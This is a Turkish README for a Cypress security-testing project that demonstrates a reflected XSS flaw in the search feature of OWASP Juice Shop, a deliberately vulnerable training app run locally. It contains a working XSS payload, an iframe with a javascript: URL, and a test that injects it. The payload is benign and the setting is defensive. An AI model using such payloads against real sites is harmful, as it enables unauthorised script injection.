# LLM-QA Security Testing – OWASP Juice Shop (XSS)

Bu repo, **LLM-QA** projesi kapsamında OWASP Juice Shop üzerinde yapılan **XSS güvenlik testi deneyi** için hazırlanmış minimal bir Cypress projesidir.

Amaç:

- GitHub’daki bir yazılım projesi (OWASP Juice Shop) üzerinde  
- LLM tabanlı kalite analiz yaklaşımına uygun olarak  
- Gerçek bir güvenlik açığını (Reflected XSS) **otomatik bir test ile kanıtlamak**  
- Bu sürecin adımlarını belgelendirmek

---

## 1. Ne Test Ediliyor?

**Hedef uygulama:** OWASP Juice Shop  
**Hedef hata:** Search özelliğinde (`/search?q=`) bulunan **Reflected XSS (Yansıtılmış XSS)** açığı

Kullanıcıdan gelen `q` parametresi yeterli filtreleme yapılmadan DOM içinde çalıştırılıyor.

Klasik `alert('XSS')` yerine daha stabil bir payload kullanıldı:

```html
<iframe src="javascript:window.parent.hacked=true"></iframe>
Bu payload çalıştığında tarayıcıdaki window objesinde şu değer oluşur:

js
Kodu kopyala
window.hacked === true
Cypress de tam olarak bunu doğrular.

2. Gereksinimler
Bu testin çalışması için:

Node.js (20.x önerilir)

npm

Yerelde çalışan OWASP Juice Shop → http://localhost:3000

Lokal veya global Cypress

Juice Shop kurulum dokümantasyonu:
https://github.com/juice-shop/juice-shop

3. Kurulum Adımları (Step-by-step)
3.1. Juice Shop’u Çalıştır
bash
Kodu kopyala
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start
Terminalde şu yazıyı görmelisin:

nginx
Kodu kopyala
Server listening on port 3000
3.2. Bu Repoyu Klonla
bash
Kodu kopyala
git clone https://github.com/mineekilincc/LLM-QA-SecurityTestingOWASP.git
cd LLM-QA-SecurityTestingOWASP
Ardından Cypress kur:

bash
Kodu kopyala
npm init -y
npm install cypress --save-dev
3.3. Cypress’i Aç
bash
Kodu kopyala
npx cypress open
Cypress açıldığında:

E2E Testing seç

Tarayıcı seç (Chrome / Electron)

Listede xss-juice-shop.cy.js görünmeli

4. Testin Çalışma Mantığı
Aşağıdaki test, XSS açığını varlık kanıtı (proof) olarak doğrular:

js
Kodu kopyala
/// <reference types="cypress" />

describe('XSS Test – OWASP Juice Shop (Variable Injection)', () => {
  it('should prove XSS by modifying the window object', () => {
    const payload = `<iframe src="javascript:window.parent.hacked=true"></iframe>`;

    cy.visit(`http://localhost:3000/#/search?q=${encodeURIComponent(payload)}`);

    cy.window().should('have.property', 'hacked', true);
  });
});
Test Adımları:
Juice Shop’un search sayfasına q parametresiyle XSS payload gönderilir.

Payload, window.parent.hacked = true değerini yazar.

Cypress cy.window() ile tarayıcı penceresini alıp değişkeni kontrol eder.

Eğer test PASS olursa → XSS açığı çalışmıştır → güvenlik zafiyeti kanıtlanmıştır.
